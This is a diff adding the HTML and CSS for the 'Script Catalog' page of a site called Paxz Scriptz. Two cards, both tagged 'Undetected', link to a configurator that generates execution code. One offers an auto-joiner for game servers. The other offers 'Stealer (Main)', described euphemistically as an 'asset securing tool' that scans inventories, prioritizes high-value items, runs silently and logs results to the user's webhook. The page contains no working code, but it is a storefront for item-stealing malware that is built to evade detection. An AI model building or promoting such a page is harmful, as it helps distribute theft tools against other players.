@@ -1,1 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scripts | Paxz Scriptz</title>
+    <style>
+        :root { --bg: #050505; --card: #0f0f0f; --accent: #8a2be2; --text: #ffffff; --text-dim: #a0a0a0; }
+        body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; }
+        
+        nav { display: flex; justify-content: space-between; align-items: center; padding: 20px 8%; background: rgba(0,0,0,0.9); position: sticky; top: 0; z-index: 1000; border-bottom: 1px solid #1a1a1a; }
+        .logo { font-size: 24px; font-weight: 800; color: white; text-decoration: none; }
+        .logo span { color: var(--accent); }
+        .nav-links a { color: var(--text-dim); text-decoration: none; margin-left: 30px; transition: 0.3s; }
+        .nav-links a:hover { color: var(--accent); }
 
+        .container { padding: 100px 8%; max-width: 1400px; margin: 0 auto; }
+        .header-box { margin-bottom: 60px; border-left: 4px solid var(--accent); padding-left: 25px; }
+        .header-box h2 { font-size: 3rem; margin: 0; }
+        
+        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); gap: 35px; }
+        
+        .card { background: var(--card); border-radius: 15px; padding: 40px; border: 1px solid #1a1a1a; transition: 0.4s; position: relative; display: flex; flex-direction: column; }
+        .card:hover { border-color: var(--accent); transform: translateY(-10px); background: #121212; }
+        .card i { color: var(--accent); font-size: 40px; margin-bottom: 20px; }
+        .card h3 { font-size: 24px; margin: 10px 0; }
+        .card p { color: var(--text-dim); line-height: 1.7; flex-grow: 1; }
+        
+        .status { font-size: 12px; font-weight: 800; text-transform: uppercase; color: #00ff00; background: rgba(0, 255, 0, 0.1); padding: 4px 10px; border-radius: 4px; display: inline-block; margin-bottom: 15px; }
+        .btn-config { margin-top: 25px; background: transparent; border: 2px solid var(--accent); color: white; padding: 12px 25px; border-radius: 5px; text-decoration: none; text-align: center; font-weight: 700; transition: 0.3s; }
+        .btn-config:hover { background: var(--accent); box-shadow: 0 0 20px rgba(138, 43, 226, 0.3); }
+    </style>
+</head>
+<body>
+    <nav>
+        <a href="index.html" class="logo">Paxz<span>Scriptz</span></a>
+        <div class="nav-links">
+            <a href="index.html">Home</a>
+            <a href="scripts.html">Scripts</a>
+            <a href="configure.html">Configurator</a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="header-box">
+            <h2>Script Catalog</h2>
+            <p style="color: var(--text-dim);">Select a script to customize and generate your execution code.</p>
+        </div>
+
+        <div class="grid">
+            <div class="card">
+                <span class="status">Undetected</span>
+                <h3>Auto Joiner</h3>
+                <p>Specifically designed for competitive game modes. Monitors server lists and automatically joins based on your custom criteria. Includes Anti-AFK and Auto-Rejoin features.</p>
+                <a href="configure.html?type=autojoin" class="btn-config">Configure Joiner</a>
+            </div>
+
+            <div class="card">
+                <span class="status">Undetected</span>
+                <h3>Stealer (Main)</h3>
+                <p>The flagship asset securing tool. Features deep-inventory scanning, high-value item prioritization, and silent execution. All actions are logged directly to your webhook.</p>
+                <a href="configure.html?type=stealer" class="btn-config">Configure Stealer</a>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
